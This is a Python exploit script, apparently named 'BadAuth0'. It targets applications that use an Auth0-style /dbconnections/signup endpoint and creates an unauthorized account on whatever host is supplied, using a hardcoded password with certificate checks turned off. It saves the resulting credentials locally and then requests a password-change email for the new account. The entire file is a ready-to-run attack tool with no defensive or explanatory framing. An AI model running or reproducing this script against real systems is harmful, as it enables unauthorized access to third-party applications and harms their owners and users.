import os
import sys
import time

import requests
import urllib3

# ANSI color codes for terminal output
BLUE = "\033[0;34m"  # Blue color code
RED = "\033[91m"    # Red color code
GREEN = "\033[32m"  # Green color code
END = "\033[0m"     # Reset color

# Banner
print(f"""{GREEN}
  ____            _    _   _   _ _   _      ___  
 | __ )  __ _  __| |  / \ | | | | |_| |__  / _ \ 
 |  _ \ / _` |/ _` | / _ \| | | | __| '_ \| | | |
 | |_) | (_| | (_| |/ ___ \ |_| | |_| | | | |_| |
 |____/ \__,_|\__,_/_/   \_\___/ \__|_| |_|\___/ 
{END}                                                                
""")
time.sleep(0.2)  # Pause for a brief moment for better UX

# Disable warnings for insecure requests (e.g., self-signed SSL certificates)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Function to create a directory for saving output files
def mk_dir(host):
    try:
        print(f"{GREEN}[+] Creating directory{END}")
        os.makedirs(host, exist_ok=True)  # Create the directory if it doesn't exist
        time.sleep(0.2)  # Brief pause for better UX
        path = os.path.abspath(host)  # Get absolute path of the directory
        print(f"{GREEN}[+] Directory successfully created\nPath: {path} {END}")
    except Exception as e:
        print(f"{RED}Error occurred: {e}{END}")

# Function to exploit a vulnerability and create an account
def exploit(host, mail):
    # Request headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
        'Content-Type': 'application/json',
    }

    # Payload for account creation
    payload = {
        'client_id': '',
        'email': f'{mail}',
        'password': 'rQ8a2;3/c[<J',  # Example password
        'connection': 'Username-Password-Authentication',
    }

    try:
        print(f"{GREEN}[+] Initializing the exploit...{END}")
        # Send POST request to create an account
        response = requests.post(
            f'https://{host}/dbconnections/signup',
            headers=headers,
            json=payload,
            verify=False,  # Don't verify SSL certificates
        )
        time.sleep(0.2)  # Brief pause for better UX

        status_code = response.status_code
        # Check if account creation was successful
        if status_code in [200, 201]:
            print(f"{GREEN}[+] Account successfully created\n{END}")
            print(f"{GREEN}[+] Email: {mail}\n{END}")
            print(f"{GREEN}[+] Pass: rQ8a2;3/c[<J\n{END}")
            print(f"{GREEN}[+] Status Code: {response.status_code}{END}")
            print(f"{GREEN}\n[+] Response body content: {response.text}{END}")
            # Save credentials to a file
            with open(f"{host}/credentials.txt", "w") as file:
                file.write(f"{payload}")
        elif "connection" in response.json():
            print(f"{RED}[-] Unable to find the required connection{END}")
            print(response.text)
        elif status_code in [404, 403]:
            print(f"{RED}[-] The application returns: {status_code}{END}")
        else:
            print(f"{RED}\n[-] The application is not exploitable\n {END}")
            print(f"{RED}[-] The status code is: {status_code}{END}")
            print("\n", response.text, "\n")
    except Exception as e:
        print(f"{RED}Error occurred: {e}{END}")

# Function to verify the email address
def mail_verify(host, mail):
    try:
        # Request headers
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Priority': 'u=0, i',
            'Content-Type': 'application/json',
        }

        # Payload for email verification
        payload = {
            'email': f'{mail}',
            'connection': 'Username-Password-Authentication'
        }
        # Send POST request for email verification
        response = requests.post(
            f'https://{host}/dbconnections/change_password',
            headers=headers,
            json=payload,
            verify=False,
        )
        if response.status_code in [200, 201]:
            print(f"{GREEN}\n[+] Email verification sent to: {mail}{END}")
        else:
            print(f"{RED}[-] Unable to verify the mail address{END}")
    except Exception as e:
        print(f"{RED}Error occurred: {e}{END}")

# Main function to handle user input and call necessary functions
def main():
    if len(sys.argv) != 3:
        print(f"{RED}[+] Usage: %s <host> <your_mail_address>{END}" % sys.argv[0])
        print(f"{RED}[+] Example: %s example.com hacker@gmail.com{END}" % sys.argv[0])
        sys.exit(1)

    host = sys.argv[1]
    mail = sys.argv[2]
    mk_dir(host)  # Create directory for output
    exploit(host, mail)  # Attempt to exploit the vulnerability
    mail_verify(host, mail)  # Verify the email address

# Entry point of the script
if __name__ == "__main__":
    main()
